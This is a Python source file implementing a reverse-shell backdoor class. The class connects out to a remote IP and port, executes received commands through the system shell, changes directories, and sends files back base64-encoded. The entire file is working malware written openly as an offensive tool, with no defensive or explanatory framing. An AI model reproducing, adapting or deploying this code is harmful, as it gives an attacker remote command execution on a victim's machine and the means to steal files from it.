import socket, json, os, base64

from subprocess import *

class ReverseBackdoor:

    def __init__(self,ip,port):
        self.ip = ip
        self.port = port

    def change_directory(self,path):
        try:
            os.chdir(path)
            out = "[+]CHANGING CURRENT WORKING DIRECTORY TO "+path
        except WindowsError:
            out = "[-]INVALID PATH"
        return self.send(out)

    def read_file(self,path):
        with open(path,"rb") as file:
            return self.send(base64.b64encode(file.read()))


    def receive(self,connection):
        data = ""
        while True:
            try:
                data += connection.recv(1024)
                command = json.loads(data)
                return command
            except ValueError:
                continue

    def send(self,data):
        output = json.dumps(data)
        return output

    def execute(self,commands):
        try:
            out = check_output(commands,shell=True)
        except CalledProcessError:
            out = "[-] INVALID COMMAND"

        return self.send(out)

    def exit(self,connection):
        connection.close()
        exit()

    def post_connection(self,connection):
        while True:
            commands = self.receive(connection)  # 1024 byte
            output =""

            if commands[0] == "exit":
                self.exit(connection)

            elif commands[0] == "cd":
                try:
                    output = self.change_directory(commands[1])
                except IndexError:
                    output = self.execute("cd")

            elif commands[0] == "download":
                try:
                    output = self.read_file(commands[1])
                except:
                    output = self.send("[-]INVALID FILE..")

            else:
                output = self.execute(commands[0])

            connection.send(output)

    def run(self):
        connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        '''
        https://www.tutorialspoint.com/python/python_networking.htm
        '''
        connection.connect((self.ip,self.port))   #ip , port in tuple
        self.post_connection(connection)
        connection.close()

